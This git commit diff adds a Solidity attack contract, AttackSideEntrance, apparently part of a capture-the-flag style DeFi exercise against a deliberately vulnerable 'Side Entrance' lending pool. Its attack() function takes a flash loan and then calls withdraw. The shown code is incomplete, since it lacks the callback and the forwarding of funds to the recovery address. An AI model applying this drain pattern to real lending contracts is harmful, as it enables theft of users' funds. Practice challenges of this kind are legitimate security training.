fa670a8ab20e9e48adb2d93eb839340d81ba2753
itsnico222 <togiabao222@gmail.com>
2025-02-25 00:36:38 +0700

    upd

--- src/attacker-contracts/AttackSideEntrance.sol
+++ src/attacker-contracts/AttackSideEntrance.sol
@@ -3,3 +3,21 @@ pragma solidity 0.8.25;
 
 import "../side-entrance/SideEntranceLenderPool.sol";
 import {SafeTransferLib} from "lib/solady/src/utils/SafeTransferLib.sol";
+
+contract AttackSideEntrance {
+    SideEntranceLenderPool pool;
+    address recovery;
+    uint256 amount;
+
+    constructor(SideEntranceLenderPool pool_, address recovery_, uint256 amount_) {
+        pool = pool_;
+        recovery = recovery_;
+        amount = amount_;
+    }
+
+    function attack() external {
+        pool.flashLoan(amount);
+        pool.withdraw();
+        
+    }
+}
